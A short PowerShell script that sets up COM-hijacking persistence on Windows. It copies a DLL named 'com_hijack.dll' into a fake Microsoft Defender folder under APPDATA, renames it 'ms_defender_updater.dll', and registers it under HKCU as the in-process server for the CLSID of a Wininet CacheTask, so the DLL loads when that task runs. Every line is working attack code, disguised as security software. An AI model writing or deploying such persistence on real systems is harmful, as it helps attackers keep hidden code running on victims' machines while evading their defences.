$currentDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$sourcePath = Join-Path -Path $currentDir -ChildPath "com_hijack.dll"
$destinationDir = "$env:APPDATA\Microsoft\Defender\1.0.3"
$dllPath = Join-Path -Path $destinationDir -ChildPath "ms_defender_updater.dll"

if (-not (Test-Path $destinationDir)) {
    New-Item -ItemType Directory -Path $destinationDir -Force | Out-Null
}

Copy-Item -Path $sourcePath -Destination $dllPath -Force

$clsid = "{0358B920-0AC7-461F-98F4-58E32CD89148}" # Wininet\CacheTask
$regPath = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"

if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}

Set-ItemProperty -Path $regPath -Name "(Default)" -Value $dllPath
Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Apartment"